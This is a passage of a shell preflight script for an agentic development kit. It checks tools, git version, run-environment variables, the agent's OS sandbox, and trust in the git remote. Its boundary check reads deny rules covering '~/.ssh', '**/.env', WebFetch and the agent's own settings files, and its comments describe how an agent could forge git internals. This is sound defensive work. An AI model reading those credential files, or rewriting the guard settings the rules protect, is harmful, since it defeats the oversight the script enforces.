#!/bin/sh
# preflight.sh — prerequisite check for Sparkwright (the agentic SDLC kit). Fails fast with
# install hints so a missing tool surfaces HERE, not as a cryptic guard/conformance
# failure later (jq is hard-required by the guard + conformance). Universal check
# always; optional per-stack toolchain via --stack.
#   sh scripts/preflight.sh [--stack <name>] [--allow-runtime-mismatch] [--selftest]
# Exit: 0 = all present · 1 = a required tool missing OR the stack's runtime floor is not met OR (a plain run) a recorded run-env variable is unset or empty (run-env) · 2 = bad usage.
# POSIX sh; dash-clean. New stack? add a row to stack_tools() (unknown degrades gracefully).
# What it changes: Read-only — checks for required/recommended tools; mutates nothing.
# Guardrails: exit 1 if a required tool is missing (recommended tools only warn); an unknown --stack degrades gracefully.
set -eu

miss=0; rec=0
bwarn=0; gpwarn=0   # SWAS-793: display-only counts for the summary line, never read by an exit. rec = advisory lines (each site adds one), bwarn = the boundary's notices (WARN lines and its lowercase warn lines), gpwarn = git-plants warnings
bfail=0; bunv=0   # SWAS-355: bfail = an UNDECLARED opt-out or a malformed declaration (moves the exit); bunv = a boundary line that could not be judged
_bj_act="opted out"   # SWAS-945: the verb boundary_judge prints in a declared WARN ("granted" for the local-bind grant, set around that one call)
_bnd_egress_gap=0; _bnd_nonegress=0   # SWAS-474: which kind of bfail the exit summary names (egress = the strict step; nonegress = any other part, or a bad declaration). Display only: never read by an exit
# RULE 3 THROUGHOUT THIS FILE (see the K11 refusal block, "THE THREE OUTPUT RULES"): `printf '%s\n'`,
# never `echo`, for any line carrying a VARIABLE. dash's builtin echo expands backslash escapes and dash
# IS /bin/sh on the ubuntu-latest runner, so a `\n` inside an interpolated value forges a whole extra
# output line. The rule was written for the K11 refusal and swept through the CP-11/CP-4 blocks; the
# security re-review (finding L-3) found a survivor, so it is now applied to every instance in the
# script's PRODUCTION path rather than to the blocks someone happened to look at.
# SCOPE, STATED SO IT IS NOT MISTAKEN FOR AN OVERSIGHT: the `--selftest` harness's own PASS/FAIL lines
# still use `echo` with interpolated fixture output. They are a test harness reporting to a developer,
# not a security surface — and a forged `PASS:` line cannot change the verdict, which is the `fail`
# accumulator: `fail` is set by the leg, never read back off stdout, so no line a fixture can produce
# moves it. Sweeping ~140 verdict lines would be diff without teeth.
# THIS SENTENCE USED TO CLAIM MORE THAN THAT — "the `fail` accumulator AND the literal
# `OK: preflight selftest` trailer that a wiring lock requires" — and the
# trailer half was wrong (security re-review, finding INFO-3). That lock (removed by SWAS-626) USED to run the
# selftest with `|| true`, discarding the exit code, and grep stdout for the literal trailer; before it was
# removed it required exit code 0 AND the exact whole line (`grep -qx`), so a forged line alone no longer satisfied it.
# (`fail` is also gated by the OTHER route: the dedicated CI step in .github/workflows/ci.yml
# that runs `sh scripts/preflight.sh --selftest` bare reads its exit code. Cited by its command rather
# than by a line number, for the reason stated at the k11_run block.) NOT EXPLOITABLE, and that is a property of the INPUTS rather than
# of the output rule: every fixture path is `mktemp -d` under TMPDIR plus a suffix this script chooses,
# and TMPDIR is the operator's or the runner's. The correction is recorded rather than quietly deleted
# because a rationale that reads stronger than it is becomes the reason a later reviewer skips the
# check — which is the failure mode this file keeps paying for.
need() {  # need <tool> <install-hint>
  if command -v "$1" >/dev/null 2>&1; then
    printf '%s\n' "  ok   $1"
  else
    printf '%s\n' "  MISS $1 — $2"
    miss=1
  fi
}
recommend() {  # recommend <tool> <why+hint> — warns, never fails the run
  if command -v "$1" >/dev/null 2>&1; then
    printf '%s\n' "  ok   $1"
  else
    printf '%s\n' "  warn $1 — $2"
    rec=$((rec + 1))
  fi
}

# SWAS-934: the run-env leg. incept records the NAMES of the redirected run variables in .kit-run/run-env.names (never values); a plain run checks that each is still set and non-empty here.
# Absent file = N/A, no line. Every line prints names and fixed text only: no value, no path (RULE 3: printf '%s\n').
RUNENV_FILE=.kit-run/run-env.names
RUNENV_FAILED=0; _rev_why=""; _rev_body=""; _rev_raw=""   # RUNENV_FAILED: this leg set miss, so the closing line can say to relaunch; _rev_body is the ONE read of the file, _rev_why the reason it is malformed
run_env_validate() {  # validates the copy in _rev_body (never the file); sets _rev_why to the reason it is malformed, "" when well-formed
  _rem_n=0; _rem_seen=" "; _rem_rest=$_rev_body; _rem_l=""
  _rem_nl=$(printf '\n.'); _rem_nl=${_rem_nl%.}
  if [ -z "$_rev_body" ]; then _rev_why="empty"; return 0; fi
  while [ -n "$_rem_rest" ]; do
    _rem_n=$((_rem_n + 1))
    case "$_rem_rest" in
      *"$_rem_nl"*) _rem_l=${_rem_rest%%"$_rem_nl"*}; _rem_rest=${_rem_rest#*"$_rem_nl"} ;;
      *) _rem_l=$_rem_rest; _rem_rest="" ;;
    esac
    if [ "$_rem_n" -gt 4 ]; then _rev_why="more than 4 lines"; return 0; fi
    case "$_rem_l" in
      CLAUDE_CONFIG_DIR|GH_CONFIG_DIR|GIT_CONFIG_GLOBAL|GIT_CONFIG_NOSYSTEM) : ;;   # MUT-RUNENV-ALLOW
      *) _rev_why="an unknown name"; return 0 ;;
    esac
    case "$_rem_seen" in
      *" $_rem_l "*) _rev_why="a repeated name"; return 0 ;;
    esac
    _rem_seen="$_rem_seen$_rem_l "
  done
}
run_env_malformed() {  # reads the names file ONCE (at most 5 lines) into _rev_body, then validates that copy; sets _rev_why ("" = well-formed)
  _rev_why=""; _rev_body=""
  if [ -L .kit-run ] || [ -L "$RUNENV_FILE" ]; then _rev_why="a symlink"; return 0; fi
  if [ ! -f "$RUNENV_FILE" ]; then _rev_why="not a regular file"; return 0; fi
  if [ ! -r "$RUNENV_FILE" ]; then _rev_why="unreadable"; return 0; fi
  # ONE capped read: dd takes at most 513 bytes (one past the cap, so a file over 512 bytes is seen as such); the x keeps a trailing newline through the substitution
  _rev_raw=$(dd bs=513 count=1 2>/dev/null < "$RUNENV_FILE"; printf x); _rev_raw=${_rev_raw%x}
  if [ "${#_rev_raw}" -gt 512 ]; then _rev_why="over 512 bytes"; return 0; fi
  if ! _rev_body=$(printf '%s' "$_rev_raw" | head -n 5); then _rev_why="unreadable"; return 0; fi
  run_env_validate
}
run_env_report() {  # <text> -> a plain run: FAIL and miss=1; under --boundary-advisory: the same text as WARN, no counter moves
  if [ "$BOUNDARY_ADVISORY" -eq 1 ]; then   # MUT-RUNENV-ADVISORY
    printf '%s\n' "  WARN run-env: $1"
  else
    printf '%s\n' "  FAIL run-env: $1"
    miss=1   # MUT-RUNENV-MISS
    RUNENV_FAILED=1
  fi
}
run_env_value_empty() {  # <name> -> 0 iff the variable is unset or empty here; the value itself is never kept or printed
  case "$1" in
    CLAUDE_CONFIG_DIR) [ -z "${CLAUDE_CONFIG_DIR:-}" ] ;;   # MUT-RUNENV-EMPTY
    GH_CONFIG_DIR) [ -z "${GH_CONFIG_DIR:-}" ] ;;   # MUT-RUNENV-EMPTY
    GIT_CONFIG_GLOBAL) [ -z "${GIT_CONFIG_GLOBAL:-}" ] ;;   # MUT-RUNENV-EMPTY
    GIT_CONFIG_NOSYSTEM) [ -z "${GIT_CONFIG_NOSYSTEM:-}" ] ;;   # MUT-RUNENV-EMPTY
  esac
}
check_run_env() {
  [ -e "$RUNENV_FILE" ] || [ -L "$RUNENV_FILE" ] || return 0   # absent: N/A, no line
  run_env_malformed
  if [ -n "$_rev_why" ]; then
    run_env_report ".kit-run/run-env.names is malformed ($_rev_why), so the run environment cannot be checked. Fix: delete the file and re-run preflight."
    return 0
  fi
  _rev_all=""; _rev_gone=""
  for _rev_l in $_rev_body; do   # the validated copy only: every word is one of the four glob-free names
    _rev_all="${_rev_all:+$_rev_all }$_rev_l"
    if run_env_value_empty "$_rev_l"; then _rev_gone="${_rev_gone:+$_rev_gone }$_rev_l"; fi
  done
  if [ -z "$_rev_gone" ]; then
    printf '%s\n' "  ok   run-env: the session has every variable recorded at inception ($_rev_all)"
    return 0
  fi
  for _rev_n in $_rev_gone; do
    run_env_report "$_rev_n was set when this project was incepted and is empty or unset in this session, so a resume or /remote-control may have dropped the run environment. Fix: end this session and relaunch with the \"Start your agent session here\" line incept printed, from a shell where $_rev_n is set; or, if this session is meant to run without the redirect, delete .kit-run/run-env.names."
  done
}

# SWAS-775: the one line a run that ends in FAIL closes with, so a person who sees red finds the one-page operator card. Called only on the boundary FAIL exit, after the closing summary
# (so after the egress block, never inside it); no exit code moves. conformance/agents-brief.sh pins the card to the texts this script prints.
operator_card_pointer() {
  printf '%s\n' 'What this means for you: docs/onboarding/operator-card.md'
}

# --- T2: git version floor for `git merge-tree --write-tree` -------------------------------
# kit-update prefers `git merge-tree --write-tree` — a NON-mutating 3-way merge (the adopter's
# worktree is never touched). That subcommand landed in git 2.38 (2022); Ubuntu 20.04 still ships
# git 2.25. DETECT AND DEGRADE: below the floor we warn and NAME the escape (the temporary-worktree
# fallback, which is also non-mutating) — we never hard-fail, and we never silently fail open.
GIT_FLOOR_MAJOR=2
GIT_FLOOR_MINOR=38

git_version_parts() {  # <version line> -> "MAJOR MINOR" on stdout; rc 1 when unparseable
  # Takes the first whitespace-separated token starting with a digit, so it survives every real
  # shape: "git version 2.39.5 (Apple Git-154)", "git version 2.25.1", "git version 2.41.0.windows.3".
  #
  # `set -f` around the split: unquoted $1 does word-splitting (which we WANT) *and* pathname expansion
  # (which we do not). A '*' anywhere in the line would glob against the CWD, so a file named '9.9.9'
  # would BE the version — the floor reading the filesystem instead of git. Quoting $1 is not the fix
  # (it would collapse the line to a single word and parse nothing); disabling globbing is. No `return`
  # inside the window, so globbing is always restored.
  _tok=""
  set -f
  for _w in $1; do
    case "$_w" in [0-9]*) _tok=$_w; break ;; esac
  done
  set +f
  [ -n "$_tok" ] || return 1
  _maj=${_tok%%.*}
  case "$_tok" in *.*) _rest=${_tok#*.} ;; *) _rest=0 ;; esac
  _min=${_rest%%.*}
  _min=${_min%%[!0-9]*}   # tolerate a pre-release tail (2.39-rc1 -> 39)
  case "$_maj" in ''|*[!0-9]*) return 1 ;; esac
  case "$_min" in ''|*[!0-9]*) return 1 ;; esac
  printf '%s %s\n' "$_maj" "$_min"
}

git_meets_floor() {  # <major> <minor> -> 0 iff >= the floor. NUMERIC compare, deliberately:
  # `[ ]`'s -gt/-ge are integer operators, so 9 -lt 38 is TRUE. A lexical compare would say
  # "2.9" > "2.38" and wave an ancient git through — a decorative floor. This is that bug's lock.
  if [ "$1" -ne "$GIT_FLOOR_MAJOR" ]; then [ "$1" -gt "$GIT_FLOOR_MAJOR" ]; return $?; fi
  [ "$2" -ge "$GIT_FLOOR_MINOR" ]
}

check_git_capability() {  # advisory: does the installed git support `merge-tree --write-tree`?
  # FLAG-NOT-ENV: the PREFLIGHT_GIT_VERSION_CMD injection seam is honored ONLY when a seam flag was
  # passed (--selftest, or --selftest-e2e for the wired end-to-end proof). In a real adopter run the
  # ambient environment cannot tell preflight what version of git they have. Advisory-only, so no
  # privilege boundary is crossed — but a check the environment can redirect is not a check, and this
  # is the same rule `incept --date` honors (a flag, never an ambient INCEPT_DATE).
  _vcmd="git --version"
  [ "${SEAMS:-0}" -eq 1 ] && _vcmd="${PREFLIGHT_GIT_VERSION_CMD:-git --version}"
  # shellcheck disable=SC2086  # deliberate word-split: the seam supplies a command line, not one word
  _ver=$(${_vcmd} 2>/dev/null) || _ver=""
  if [ -z "$_ver" ]; then
    echo "  skip git version — could not run 'git --version' (cannot detect merge-tree support)"; return 0
  fi
  if ! _parts=$(git_version_parts "$_ver"); then
    printf '%s\n' "  skip git version — unrecognised version string: $_ver"; return 0   # Rule 3
  fi
  _gmaj=${_parts% *}; _gmin=${_parts#* }
  if git_meets_floor "$_gmaj" "$_gmin"; then
    printf '%s\n' "  ok   git $_gmaj.$_gmin — 'git merge-tree --write-tree' available (floor $GIT_FLOOR_MAJOR.$GIT_FLOOR_MINOR)"
  else
    printf '%s\n' "  warn git $_gmaj.$_gmin is below the $GIT_FLOOR_MAJOR.$GIT_FLOOR_MINOR floor — 'git merge-tree --write-tree' is unavailable."
    echo "       kit-update will use its temporary-worktree fallback instead of merge-tree. The fallback is"
    echo "       still non-mutating (your worktree is never touched); upgrading git only makes it faster."
    rec=$((rec + 1))
  fi
}

# --- the agent's OS sandbox (GUARD-CP-READONLY-SANDBOX) -------------------------------------
# Claude Code's OS sandbox (shipped on) keeps the enforcement layer read-only to the agent's shell.
# The shipped default sets no `failIfUnavailable`, so a machine where the sandbox cannot start runs the
# session UNSANDBOXED, and this reports that loudly. The optional deny-only overlay
# (templates/sandbox-overlay.settings.local.json) sets `failIfUnavailable: true` to refuse instead.
# WARN-only: it never sets `miss`.
# FLAG-NOT-ENV, like the git seam above: the PREFLIGHT_SANDBOX_* seams are honored only under a seam flag.
# SANDBOX_REASON is set (not printed) so the selftest can assert it without parsing output.
sandbox_unavailable_reason() {  # prints a reason and returns 1 when the sandbox cannot start; 0 if it can
  _sos=$(uname -s 2>/dev/null) || _sos=""
  _stools=""
  _sbwrap_ok=1
  if [ "${SEAMS:-0}" -eq 1 ]; then
    _sos="${PREFLIGHT_SANDBOX_OS:-$_sos}"
    _stools="${PREFLIGHT_SANDBOX_TOOLS:-}"
    _sbwrap_ok="${PREFLIGHT_SANDBOX_BWRAP_OK:-1}"
  else
    for _t in sandbox-exec bwrap socat; do command -v "$_t" >/dev/null 2>&1 && _stools="$_stools $_t"; done
    if command -v bwrap >/dev/null 2>&1 && bwrap --unshare-net --ro-bind / / true >/dev/null 2>&1; then _sbwrap_ok=1; else _sbwrap_ok=0; fi
  fi
  case "$_sos" in
    Darwin)
      case " $_stools " in *" sandbox-exec "*) return 0 ;; esac
      echo "sandbox-exec is not on PATH"; return 1 ;;
    Linux)
      case " $_stools " in *" bwrap "*) : ;; *) echo "bubblewrap (bwrap) is not installed"; return 1 ;; esac
      case " $_stools " in *" socat "*) : ;; *) echo "socat is not installed"; return 1 ;; esac
      [ "$_sbwrap_ok" = 1 ] || { echo "bwrap cannot create a sandbox here (unprivileged user namespaces are blocked, as in many containers)"; return 1; }
      return 0 ;;
    *) echo "this OS has no supported sandbox (macOS, Linux and WSL2 only)"; return 1 ;;
  esac
}

sandbox_enabled_in() {  # <settings file> -> prints true, false or unset (the file's own sandbox.enabled)
  [ -f "$1" ] || { echo unset; return 0; }
  jq -r '.sandbox | if type == "object" and has("enabled") then (if .enabled == true then "true" else "false" end) else "unset" end' "$1" 2>/dev/null || echo unset
}

# The profile line. The shipped .claude/settings.json carries the sandbox block, so the default is ON; off means
# turned off in a scope, or no block. Claude Code takes
# scalars from the highest-precedence scope that sets them: managed > local > project > user. So the EFFECTIVE
# enabled is the first of those files (in that order) that sets sandbox.enabled; none sets it = off. The managed
# file is read where readable (macOS /Library/Application Support/ClaudeCode/managed-settings.json, Linux
# /etc/claude-code/managed-settings.json). The "cannot start here" warn shows whenever enabled resolves true:
# with the sandbox off there is nothing to start. Informational: never sets `miss`.
# user_settings_scope (SWAS-1012): the user-scope settings file Claude Code reads. Sets _us_path (the file to read), _us_label (what to print: the variable's NAME, never its value),
# _us_rel (1 when CLAUDE_CONFIG_DIR is set, non-empty and not absolute: the scope is then not read, HOME's file is never read in its place) and _us_cfg (1 when the variable chose the file).
user_settings_scope() {
  _us_path="${HOME:-}/.claude/settings.json"; _us_rel=0; _us_cfg=0
  # shellcheck disable=SC2088  # a literal label printed to a person, never a path the shell opens
  _us_label="~/.claude/settings.json"
  [ -n "${CLAUDE_CONFIG_DIR:-}" ] || return 0   # MUT-CCD-EMPTY
  _us_label='$CLAUDE_CONFIG_DIR/settings.json'   # MUT-CCD-LABEL
  case "$CLAUDE_CONFIG_DIR" in
    /*) _us_path="$CLAUDE_CONFIG_DIR/settings.json"; _us_cfg=1 ;;   # MUT-CCD-ROUTE
    *)
      _us_path=""   # MUT-CCD-RELPATH
      _us_rel=1 ;;   # MUT-CCD-REL
  esac
}
check_sandbox() {
  user_settings_scope
  _sfile=".claude/settings.json"; _sloc=".claude/settings.local.json"; _suser="$_us_path"; _srel=$_us_rel
  # in a session a CLAUDE_CONFIG_DIR file may not be read-denied to the shell as HOME's is: it is not read
  _ssess=0; if [ -n "${SANDBOX_RUNTIME:-}" ] && [ "$_us_cfg" -eq 1 ]; then _ssess=1; fi   # MUT-CCD-SESS
  case "$(uname -s 2>/dev/null)" in
    Darwin) _smgd="/Library/Application Support/ClaudeCode/managed-settings.json" ;;
    *) _smgd="/etc/claude-code/managed-settings.json" ;;
  esac
  if [ "${SEAMS:-0}" -eq 1 ]; then
    _sfile="${PREFLIGHT_SANDBOX_SETTINGS:-$_sfile}"; _sloc="${PREFLIGHT_SANDBOX_LOCAL:-$_sloc}"
    if [ -n "${PREFLIGHT_SANDBOX_USER:-}" ]; then _srel=0; _ssess=0; fi
    _suser="${PREFLIGHT_SANDBOX_USER:-$_suser}"; _smgd="${PREFLIGHT_SANDBOX_MANAGED:-$_smgd}"
  fi
  command -v jq >/dev/null 2>&1 || { echo "  skip sandbox profile — jq absent"; return 0; }
  _snote=""; if [ "$_srel" -eq 1 ]; then _snote=" (user scope not read: CLAUDE_CONFIG_DIR is not an absolute path)"; fi
  if [ "$_ssess" -eq 1 ]; then _snote=" (user scope not read in a session: CLAUDE_CONFIG_DIR is set)"; fi
  _seff='unset'
  for _sf in "$_smgd" "$_sloc" "$_sfile" "$_suser"; do
    if { [ "$_srel" -eq 1 ] || [ "$_ssess" -eq 1 ]; } && [ "$_sf" = "$_suser" ]; then continue; fi
    _sen=$(sandbox_enabled_in "$_sf")
    if [ "$_sen" != unset ]; then _seff=$_sen; break; fi
  done
  if [ "$_seff" != true ]; then
    printf '%s\n' "  ok   agent OS sandbox: off (the shipped default is on; here it is turned off in a settings scope or the settings carry no sandbox block; to restore it, remove the override; to keep it off, declare the opt-out in .kit/boundary-optout.conf)$_snote"
    return 0
  fi
  printf '%s\n' "  ok   agent OS sandbox: on (the guard files are read-only to the shell; an update that changes them is one terminal git command)$_snote"
  if _sreason=$(sandbox_unavailable_reason); then
    echo "  ok   agent OS sandbox can start here"
    # SWAS-903: inside the macOS sandbox a bare `gh` fails TLS (x509 OSStatus -26276); the kit's own verbs set their own trust store. Informational, never a warn.
    _sgos=$(uname -s 2>/dev/null) || _sgos=""
    if [ "${SEAMS:-0}" -eq 1 ]; then _sgos="${PREFLIGHT_SANDBOX_OS:-$_sgos}"; fi
    if [ "$_sgos" = Darwin ] && [ -z "${SSL_CERT_FILE-}" ] && [ -z "${SSL_CERT_DIR-}" ]; then
      echo "  info gh: inside the sandbox a bare gh call fails TLS (x509: OSStatus -26276). Fix: start the command with SSL_CERT_FILE=/private/etc/ssl/cert.pem gh ... ; the prefix must be the first bytes of the command, alone (D-241120-1). Kit verbs set it themselves."   # MUT-GH-FIX
    fi
  else
    printf '%s\n' "  warn agent OS sandbox cannot start here: $_sreason."   # Rule 3
    echo "       The sandbox is configured but the default runs WITHOUT it: the guard still runs,"
    echo "       but the guard files (.claude/, hooks/, .kit/, .git/hooks, .git/config) are not read-only to the shell."
    echo "       Fix: install the missing piece (Linux/WSL2: bubblewrap and socat), or accept the reduced"
    echo "       protection (the optional overlay sets failIfUnavailable to refuse instead). See docs/operations/runtime-guards.md, section \"Below the text layer: the OS sandbox and the deny-only overlay\"."
    rec=$((rec + 1))
  fi
}

# --- the agent boundary, read from the settings (SWAS-354, slice 352b; design 2026-10-23-agent-boundary-on-by-default, section 6.1) ---------
# Names the three states the day-one default is about: read-deny, write-protect and egress. KEYS ONLY: each scope is read through one jq filter
# that returns booleans (is the key present, does the list hold this one name); no value, no other key, no env block is stored or printed (a user
# settings file can hold tokens; the selftest plants one and fails if it appears). Scopes, in Claude Code's precedence: managed > local > project
# > user. `enabled` is a scalar (the first scope that sets it decides, and only when no higher scope was unreadable); the lists concatenate (any
# readable scope that holds the name counts). `strictAllowlist` counts ONLY from managed or user scope: Claude Code ignores it in a repo file
# (doc fact 3), so the line says so instead of reading a repo copy as enforced (Q14). The user scope is read-denied to the agent's own shell by
# design (S-2): unreadable there, or the in-session marker SANDBOX_RUNTIME set (measured, owner runs 1-3), reads UNVERIFIED, never ON and never
# NOT ENFORCED. The marker can only LOSE information if spoofed. A static read is a declaration, not a proof: the line is labelled [static].
# It never sets `miss` or `rec`. SWAS-355 (355a): ONE state moves the exit, through its own accumulator `bfail`: an opt-out with no matching entry in
# .kit/boundary-optout.conf on origin's default branch (`and UNDECLARED`), or a malformed declaration. A declared opt-out is loud and does not fail.
# Under CI (CI or GITHUB_ACTIONS set) only the committed project block is read and the line says so: [declared], never [static]. FLAG-NOT-ENV, like
# check_sandbox: the PREFLIGHT_SANDBOX_* and PREFLIGHT_BOUNDARY_OPTOUT seams are honoured only under a seam flag.
boundary_read_scope() {  # <file> -> "absent", "unreadable", or one JSON line of booleans and the enabled word (never a value)
  [ -e "$1" ] || [ -L "$1" ] || { echo absent; return 0; }
  # A scope that is not a regular file (a FIFO, a symlink to /dev/zero) is unreadable and is never opened: `tr < file` on it would hang the run.
  [ -f "$1" ] || { echo unreadable; return 0; }   # MUT-ISFILE
  # jq is laxer than JSON.parse (Claude Code's parser): a BOM, nan / NaN / Infinity and the numbers 01, .5, +1 read here but make the file unparseable
  # there, so such a file is UNVERIFIED, never read as ON (the same test as guard-wired.sh `_gw_bd_strict`).
  # A byte below 0x20 other than tab, LF and CR (a NUL) is refused first: BSD awk truncates a record at NUL, which would hide the rest from the token test.
  [ "$(LC_ALL=C tr -d '\011\012\015\040-\377' < "$1" 2>/dev/null | wc -c | tr -d ' ')" = 0 ] || { echo unreadable; return 0; }
  [ "$(head -c 3 "$1" 2>/dev/null | od -An -tx1 | tr -d ' \n')" != efbbbf ] || { echo unreadable; return 0; }
  awk '{ gsub(/\r/, " "); gsub(/"([^"\\]|\\.)*"/, ""); gsub(/[][{},:]/, " ")
         for (i = 1; i <= NF; i++) { t = $i
           if (t == "true" || t == "false" || t == "null") continue
           if (t ~ /^-?(0|[1-9][0-9]*)(\.[0-9]+)?([eE][+-]?[0-9]+)?$/) continue
           bad = 1 } }
       END { exit bad }' "$1" 2>/dev/null || { echo unreadable; return 0; }
  # Captured, never streamed: a jq that prints a value and then fails on trailing bytes (some Linux builds, on a NUL) would otherwise leave a JSON line
  # AND "unreadable" on stdout, and the caller's second jq would abort the whole run under set -e.
  _brs=$(jq -c '{
      e: (try (.sandbox.enabled | if . == true then "true" elif . == false then "false" else "unset" end) catch "unset"),
      rt: (try (any(.sandbox.filesystem.denyRead[]?; . == "**/.env")) catch false),
      rh: (try (any(.sandbox.filesystem.denyRead[]?; . == "~/.ssh")) catch false),
      wp: (try (any(.sandbox.filesystem.denyWrite[]?; . == "./.claude")) catch false),
      wu: (try (any(.sandbox.filesystem.denyWrite[]?; . == "~/.claude/settings.json")) catch false),
      st: (try (.sandbox.network.strictAllowlist == true) catch false),
      wf: (try (any(.permissions.deny[]?; . == "WebFetch")) catch false),
      ax: (try (.sandbox.filesystem | if type == "object" and has("allowRead") then (.allowRead | if type == "array" then any(.[]; . != "**/.env.example" and . != "**/.env.sample") else true end) else false end) catch false),
      au: (try (.sandbox.allowUnsandboxedCommands | (. != null and . != false)) catch false),
      lb: (try (.sandbox.network.allowLocalBinding | if . == true then "true" elif . == false then "false" else "unset" end) catch "unset")
    }' "$1" 2>/dev/null) || { echo unreadable; return 0; }
  # Exactly ONE non-empty line: `jq -c` prints one line per JSON document (rc 0), so a two-document file would be read as its first document, and an empty or
  # whitespace-only file prints nothing. Claude Code rejects both, so both are unreadable.
  case "$_brs" in   # MUT-ONEDOC
    ''|*"$_bd_nl"*) echo unreadable; return 0 ;;
  esac
  printf '%s\n' "$_brs"
}

# --- SWAS-355 (355a): the opt-out declaration, .kit/boundary-optout.conf, read from ORIGIN'S DEFAULT BRANCH (D-241023-2 item 4; design 2026-10-25-352c) ---
# Never the working tree: an uncommitted agent edit declares nothing. Sets BD_STATE (absent | ok | malformed | unreadable | untrusted: an integrity refusal, D-241026-2, which fails like UNDECLARED), BD_REMEDY, BD_WHY (the reason; for a malformed
# file "line <n>: <rule>", never the text) and BD_RECS (one "<part> <since> <lost>" line per record). A malformed file declares NOTHING (fail closed).
# KEEP boundary_rel_blob IN STEP with scripts/doctor.sh _fg_rel_blob and scripts/promotion-verify.sh pv_rel_blob; a selftest cell asserts the load-bearing lines.
BD_STATE=""; BD_WHY=""; BD_RECS=""; _bcs=""; _bcl=""
_bd_nl='
'
boundary_rel_blob() {  # <tip> <path>: the blob (regular files only); rc 0 printed | 1 absent | 2 present but not a regular file
  _bb_ent=$(GIT_NO_REPLACE_OBJECTS=1 git ls-tree --full-tree "$1" -- "$2" 2>/dev/null | head -1 || true)
  if [ -z "$_bb_ent" ]; then
    case "$2" in
      */*)
        _bb_d=$(GIT_NO_REPLACE_OBJECTS=1 git ls-tree --full-tree "$1" -- "${2%%/*}" 2>/dev/null | head -1 || true)
        if [ -n "$_bb_d" ] && [ "${_bb_d%% *}" != 040000 ]; then return 2; fi ;;
    esac
    return 1
  fi
  case "${_bb_ent%% *}" in
    100644|100755) ;;
    *) return 2 ;;
  esac
  _bb_o=${_bb_ent#* }; _bb_o=${_bb_o#* }; _bb_o=${_bb_o%%"$(printf '\t')"*}
  GIT_NO_REPLACE_OBJECTS=1 git cat-file blob "$_bb_o" 2>/dev/null
}
_bo_ssh='ssh -o BatchMode=yes -o ConnectTimeout=5 -o ServerAliveInterval=5 -o ServerAliveCountMax=2 -o StrictHostKeyChecking=yes'   # MUT-STRICTHOST. S4: an ssh remote that stalls after connecting is cut off in about 10 s; S8: a changed or unknown host key is refused, never accepted silently
# D-241026-2: the ONE place that classifies a refusal. UNTRUSTED = an integrity refusal (the origin read would come from a repository this directory does not
# own, or would run a configured program): from a human terminal it FAILs like UNDECLARED. UNVERIFIED = could not be read (network, an unfetched tip, ...): gates like UNDECLARED
# from a terminal only while a part is OFF (S20); with every part ON it never gates. --boundary-offline (typed) turns that FAIL into a WARN (and doctor reads UNVERIFIED).
# Move a reason between the two with a one-line change here.
boundary_refusal_class() {  # <reason key> -> UNTRUSTED | UNVERIFIED
  case "$1" in
    url-differs|env-redirect|git-dir-outside|uploadpack|local-origin|helper-origin|no-origin|fetch-refspec|tip-object-missing) echo UNTRUSTED ;;   # MUT-CLASS
    *) echo UNVERIFIED ;;
  esac
}
boundary_refuse() {  # <reason key> <why> [remedy]: sets BD_WHY and BD_REMEDY; rc 4 for an UNTRUSTED reason, rc 3 for an UNVERIFIED one
  BD_WHY=$2; BD_REMEDY=${3:-}; BD_CAUSE=$1
  [ "$(boundary_refusal_class "$1")" = UNTRUSTED ] || return 3
  return 4
}
# A git directory outside the tree is trusted only for a linked worktree whose back-links agree and whose main repository vouches for it (never a bare pointer):
#   .git is a regular file naming <common>/worktrees/<name>, whose `gitdir` file names THIS directory's .git; <common> is a real <root>/.git of a repository that owns
#   itself; and `git worktree list` run on <common> names this directory. The origin is then read from <common>'s config.
# Anything else (a symlinked .git, a submodule, a pointer with no back-link, a forged pointer) is not trusted. Still forgeable, stated plainly: an agent that writes .git
# internals can write the admin entry too, or run `git remote set-url` to a forged forge; that is the drift-control residual, not a boundary.
boundary_gitdir_trusted() {  # <dir> -> 0 iff the git dir is inside the tree, or a linked worktree git's own records vouch for; sets _gt_common (the common dir) for a worktree, _gt_kind=submodule for a submodule
  _gt_common=""; _gt_kind=""
  git_dir_outside "$1" || return 0
  { [ -f "$1/.git" ] && [ ! -L "$1/.git" ]; } || return 1
  _gt_l=$(head -1 "$1/.git" 2>/dev/null) || return 1
  case "$_gt_l" in "gitdir: "?*) ;; *) return 1 ;; esac
  _gt_g=${_gt_l#gitdir: }; case "$_gt_g" in /*) ;; *) _gt_g=$1/$_gt_g ;; esac
  _gt_gp=$(CDPATH='' cd "$_gt_g" 2>/dev/null && pwd -P) || return 1
  _gt_me=$(CDPATH='' cd "$1" 2>/dev/null && pwd -P) || return 1
  case "$_gt_gp" in
    */worktrees/?*)
      [ -f "$_gt_gp/gitdir" ] || return 1
      _gt_b=$(head -1 "$_gt_gp/gitdir" 2>/dev/null) || return 1
      case "$_gt_b" in /*) ;; *) _gt_b=$_gt_gp/$_gt_b ;; esac
      [ "${_gt_b##*/}" = .git ] || return 1
      _gt_bp=$(CDPATH='' cd "${_gt_b%/*}" 2>/dev/null && pwd -P) || return 1
      [ "$_gt_bp" = "$_gt_me" ] || return 1   # MUT-BACKLINK
      # The back-link is a file an agent can write too, so it is not enough alone: the common dir must be a real <root>/.git of a repository that owns itself, with no
      # redirect variable, and ITS OWN `git worktree list` must name this directory. The origin is then read from that common dir's config (the caller compares it).
      # I2: a BARE common dir (`git clone --bare` + `git worktree add`, or the `.bare` layout) is trusted when git itself says core.bare is true.
      _gt_cd=${_gt_gp%/worktrees/*}
      { [ -d "$_gt_cd" ] && [ ! -L "$_gt_cd" ]; } || return 1
      ! git_env_redirected || return 1
      case "$_gt_cd" in
        */.git)
          _gt_main=${_gt_cd%/.git}
          [ "$(owning_repo_root "$_gt_main")" = "$_gt_main" ] || return 1 ;;   # belt: no coded mutant, a hand-made main repository cannot be built to fail only this
        *)
          [ "$(git --git-dir="$_gt_cd" config --bool core.bare 2>/dev/null)" = true ] || return 1 ;;   # MUT-BARE
      esac
      _gt_hit=$(git --git-dir="$_gt_cd" worktree list --porcelain 2>/dev/null | sed -n 's/^worktree //p' | while IFS= read -r _gt_w; do
        _gt_wp=$(CDPATH='' cd "$_gt_w" 2>/dev/null && pwd -P) || continue
        if [ "$_gt_wp" = "$_gt_me" ]; then echo y; break; fi
      done)
      [ "$_gt_hit" = y ] || return 1   # belt: no coded mutant, a real admin entry is always listed and a half-made one is rejected by git first
      _gt_common=$_gt_cd
      return 0 ;;
    */.git/modules/?*)
      # A submodule's gitdir, its core.worktree and the superproject's .gitmodules are all files an agent can write, so a submodule binds to nothing it cannot forge:
